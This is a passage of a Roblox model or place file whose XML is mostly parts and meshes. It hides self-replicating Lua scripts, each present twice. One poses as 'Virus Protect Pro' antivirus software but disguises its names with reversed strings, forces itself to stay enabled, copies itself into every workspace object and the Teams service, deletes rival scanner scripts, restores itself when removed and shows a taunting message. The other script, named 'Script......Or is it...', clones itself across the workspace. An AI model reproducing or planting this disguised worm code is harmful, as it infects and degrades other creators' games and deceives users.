							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX64">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX65">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>12.5</X>
								<Y>8</Y>
								<Z>-23.5</Z>
								<R00>-0</R00>
								<R01>0</R01>
								<R02>1</R02>
								<R10>-0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>-1</R20>
								<R21>0</R21>
								<R22>0</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX66">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX67">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>12.5</X>
								<Y>8</Y>
								<Z>-22.5</Z>
								<R00>-0</R00>
								<R01>0</R01>
								<R02>1</R02>
								<R10>-0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>-1</R20>
								<R21>0</R21>
								<R22>0</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX68">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX69">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">5</int>
							<CoordinateFrame name="CFrame">
								<X>12.5</X>
								<Y>8</Y>
								<Z>-24.5</Z>
								<R00>-0</R00>
								<R01>0</R01>
								<R02>1</R02>
								<R10>-0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>-1</R20>
								<R21>0</R21>
								<R22>0</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
					</Item>
					<Item class="Part" referent="RBX70">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>12.5</X>
								<Y>8</Y>
								<Z>-20.5</Z>
								<R00>-0</R00>
								<R01>0</R01>
								<R02>1</R02>
								<R10>-0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>-1</R20>
								<R21>0</R21>
								<R22>0</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX71">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
				</Item>
			</Item>
			<Item class="VelocityMotor" referent="RBX72">
				<Properties>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<float name="CurrentAngle">0</float>
					<float name="DesiredAngle">0</float>
					<Ref name="Hole">null</Ref>
					<float name="MaxVelocity">0</float>
					<string name="Name">ViVRuS</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Geometry" referent="RBX73">
					<Properties>
						<string name="Name">ViVRuS</string>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX74">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">AntiVirusSoftware</string>
							<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
			<Item class="RotateP" referent="RBX75">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX76">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="Geometry" referent="RBX77">
					<Properties>
						<string name="Name">ORLY</string>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
		</Item>
		<Item class="Part" referent="RBX78">
			<Properties>
				<bool name="Anchored">true</bool>
				<float name="BackParamA">-0.5</float>
				<float name="BackParamB">0.5</float>
				<token name="BackSurface">0</token>
				<token name="BackSurfaceInput">0</token>
				<float name="BottomParamA">-0.5</float>
				<float name="BottomParamB">0.5</float>
				<token name="BottomSurface">4</token>
				<token name="BottomSurfaceInput">0</token>
				<int name="BrickColor">5</int>
				<CoordinateFrame name="CFrame">
					<X>20</X>
					<Y>17.5</Y>
					<Z>-24.3999996</Z>
					<R00>0</R00>
					<R01>0</R01>
					<R02>1</R02>
					<R10>1</R10>
					<R11>0</R11>
					<R12>0</R12>
					<R20>0</R20>
					<R21>1</R21>
					<R22>0</R22>
				</CoordinateFrame>
				<bool name="CanCollide">true</bool>
				<bool name="DraggingV1">false</bool>
				<float name="Elasticity">0.5</float>
				<token name="FormFactor">1</token>
				<float name="Friction">0.300000012</float>
				<float name="FrontParamA">-0.5</float>
				<float name="FrontParamB">0.5</float>
				<token name="FrontSurface">0</token>
				<token name="FrontSurfaceInput">0</token>
				<float name="LeftParamA">-0.5</float>
				<float name="LeftParamB">0.5</float>
				<token name="LeftSurface">0</token>
				<token name="LeftSurfaceInput">0</token>
				<bool name="Locked">false</bool>
				<token name="Material">256</token>
				<string name="Name">Smooth Block Model</string>
				<float name="Reflectance">0</float>
				<float name="RightParamA">-0.5</float>
				<float name="RightParamB">0.5</float>
				<token name="RightSurface">0</token>
				<token name="RightSurfaceInput">0</token>
				<Vector3 name="RotVelocity">
					<X>0</X>
					<Y>0</Y>
					<Z>0</Z>
				</Vector3>
				<float name="TopParamA">-0.5</float>
				<float name="TopParamB">0.5</float>
				<token name="TopSurface">3</token>
				<token name="TopSurfaceInput">0</token>
				<float name="Transparency">0</float>
				<Vector3 name="Velocity">
					<X>0</X>
					<Y>0</Y>
					<Z>0</Z>
				</Vector3>
				<bool name="archivable">true</bool>
				<token name="shape">1</token>
				<Vector3 name="size">
					<X>1</X>
					<Y>25.2000008</Y>
					<Z>20</Z>
				</Vector3>
			</Properties>
			<Item class="VelocityMotor" referent="RBX79">
				<Properties>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<float name="CurrentAngle">0</float>
					<float name="DesiredAngle">0</float>
					<Ref name="Hole">null</Ref>
					<float name="MaxVelocity">0</float>
					<string name="Name">ViVRuS</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="RotateP" referent="RBX80">
					<Properties>
						<float name="BaseAngle">0.25</float>
						<CoordinateFrame name="C0">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<CoordinateFrame name="C1">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<string name="Name">ViVRuS</string>
						<Ref name="Part0">null</Ref>
						<Ref name="Part1">null</Ref>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX81">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">AntiVirusSoftware</string>
							<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
			<Item class="RotateP" referent="RBX82">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX83">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
